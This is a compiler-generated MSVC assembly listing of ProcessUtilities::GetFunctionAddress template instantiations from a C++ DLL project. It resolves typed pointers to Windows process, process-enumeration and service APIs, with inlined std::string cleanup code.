; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN33@GetFunctio

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN36@GetFunctio:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN22@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rax, rbx

; 70   : 	}

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN33@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@GetFunctio:
??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *)>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
?dtor$0@?0???$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *)>'::`1'::dtor$0
	mov	rcx, QWORD PTR proc$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0???$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *)>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetFunctionAddress<void * (__cdecl*)(unsigned long,unsigned long)>, COMDAT

; 68   : 	fpType GetFunctionAddress(HMODULE lib, std::string proc) {

$LN46:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 96					; 00000060H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdi, rdx
	mov	rbx, rcx
	mov	QWORD PTR proc$GSCopy$[rsp], rdx

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN22@GetFunctio

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN36@GetFunctio

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN33@GetFunctio

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN36@GetFunctio:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN22@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rax, rbx

; 70   : 	}

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN33@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@GetFunctio:
??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetFunctionAddress<void * (__cdecl*)(unsigned long,unsigned long)>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
?dtor$0@?0???$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetFunctionAddress<void * (__cdecl*)(unsigned long,unsigned long)>'::`1'::dtor$0
	mov	rcx, QWORD PTR proc$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0???$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetFunctionAddress<void * (__cdecl*)(unsigned long,unsigned long)>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,tagPROCESSENTRY32W *)>, COMDAT

; 68   : 	fpType GetFunctionAddress(HMODULE lib, std::string proc) {

$LN46:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 96					; 00000060H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdi, rdx
	mov	rbx, rcx
	mov	QWORD PTR proc$GSCopy$[rsp], rdx

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN22@GetFunctio

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN36@GetFunctio

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN33@GetFunctio

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN36@GetFunctio:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN22@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rax, rbx

; 70   : 	}

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN33@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@GetFunctio:
??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,tagPROCESSENTRY32W *)>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
?dtor$0@?0???$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,tagPROCESSENTRY32W *)>'::`1'::dtor$0
	mov	rcx, QWORD PTR proc$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0???$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,tagPROCESSENTRY32W *)>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,unsigned long,wchar_t const *,wchar_t *,unsigned long,void *,wchar_t const *,_STARTUPINFOW *,_PROCESS_INFORMATION *)>, COMDAT

; 68   : 	fpType GetFunctionAddress(HMODULE lib, std::string proc) {

$LN46:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 96					; 00000060H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdi, rdx
	mov	rbx, rcx
	mov	QWORD PTR proc$GSCopy$[rsp], rdx

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN22@GetFunctio

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN36@GetFunctio

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN33@GetFunctio

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN36@GetFunctio:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN22@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rax, rbx

; 70   : 	}

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN33@GetFunctio:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@GetFunctio:
??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,unsigned long,wchar_t const *,wchar_t *,unsigned long,void *,wchar_t const *,_STARTUPINFOW *,_PROCESS_INFORMATION *)>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
?dtor$0@?0???$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,unsigned long,wchar_t const *,wchar_t *,unsigned long,void *,wchar_t const *,_STARTUPINFOW *,_PROCESS_INFORMATION *)>'::`1'::dtor$0
	mov	rcx, QWORD PTR proc$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0???$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,unsigned long,wchar_t const *,wchar_t *,unsigned long,void *,wchar_t const *,_STARTUPINFOW *,_PROCESS_INFORMATION *)>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(SC_HANDLE__ *,char const *,unsigned long)>, COMDAT

; 68   : 	fpType GetFunctionAddress(HMODULE lib, std::string proc) {

$LN46:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 96					; 00000060H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdi, rdx
	mov	rbx, rcx
	mov	QWORD PTR proc$GSCopy$[rsp], rdx

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

